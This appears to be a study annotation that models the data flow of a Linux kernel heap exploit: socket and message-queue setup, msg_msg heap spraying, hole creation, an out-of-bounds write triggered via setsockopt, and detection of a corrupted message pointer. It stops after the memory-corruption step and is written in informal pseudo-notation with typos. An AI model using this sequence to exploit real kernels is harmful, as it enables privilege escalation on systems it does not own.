 [data1] int s;
 [data2] int fd;
 [data3] int ss[NUM_SOCKETS][2];
 [data4] int pipefd[NUM_PIPEFDS][2];
 [data5] int msqid[NUM_MSQIDS];

 [data6] char secondary_buf[SECONDARY_SIZE - SKB_SHARED_INFO_SIZE];

 [data7] struct msg_msg *msg;
 [data8] struct pipe_buf_operations *ops;
 [data9] struct pipe_buffer *buf;

 [data10] uint64_t kheap_addr = 0
 int fake_idx = -1, real_idx = -1;
 
 [data11] struct msg_primary;
 [data12] struct msg_secondary;
 [data13] struct msg_fake;

 [data14] struct data;
 [data15] uint64_t kbase_addr = 0;

====================================================
#### crating a socket #####
### Not a data structure, it's an integer ####
[flow] data1.0 ---= socket(conts) ---> data1.0 -- ## it does not chang a data structure

[flow] [data3.0] empty : array { top } * conts --- socketpair ---> [data3.1] full : array { top 1,...,4}
[flow] [data5.0] empty : array { top } ---= msgget(conts) ---> [data5.1] full : array { top 1,...,4096}

########################################
#### Step 1 – Memory Corruption #######
########################################
#### Spraying primary messages...####
#*** Treating pointer as linkedList in this context??? ***
[flow] data11.0 empty : ptr(linkedList) { top } * "0" --- memset ---> [data11.1] working : ptr(linkedList) { top "0" }
     *(int *)&[data11.1].mtext[0] = conts;
     *(int *)&[data11.1].mtext[4] = 1,…,4096;
### write/send primary messages to the message queue ####
## [flow] data5.1,…,data5.4096 * &data11.1 --- write_msg ---> &data11.1

#### Spraying secondary messages...####
[flow] data12.0 empty : ptr(linkedList) { top }  * "0"  --- memset ---> [data12.1] working : ptr(linkedList) { top "0" }
   *(int *)&[data12.1].mtext[0] = conts;
   *(int *)&[data12.1].mtext[4] = 1,…,4096;
########## write secondary messages to the message queue  ############
## [flow] data5.1,…,data5.4096 * &data12.1 --- write_msg ---> &data12.1

########### creating holes in the primary message #############
[flow] [data5.1] full : array { top,... } * [data11.1] working : ptr(linkedList) { top "0" } --- read_msg --->  [data11.2] working : ptr(linkedList) { top }

### trigger the out of bond write ###
### the socket data1.1 is used to trigger an overflow that is read from the message queue
*** [flow] data1.1  --- trigger_oob_write ---> data1.1
*** [flow] data1.1  * data14.0 * conts --- setsockopt ---> data14.1

### Searching for corrupted primary message ###
#### vulnerable state #######
[flow] [data5.1] full : array { top,... }  * &data12.1 working : ptr(linkedList) { top "0" }  --- peek_msg ---> [data12.2] working : ptr(linkedList) { top }
### fake_idx's primary message has a corrupted next pointer; wrongly 
### pointing to real_idx's secondary message. ##########
            fake_idx = i;
            real_idx = *(int *)&[data12.2].mtext[4];


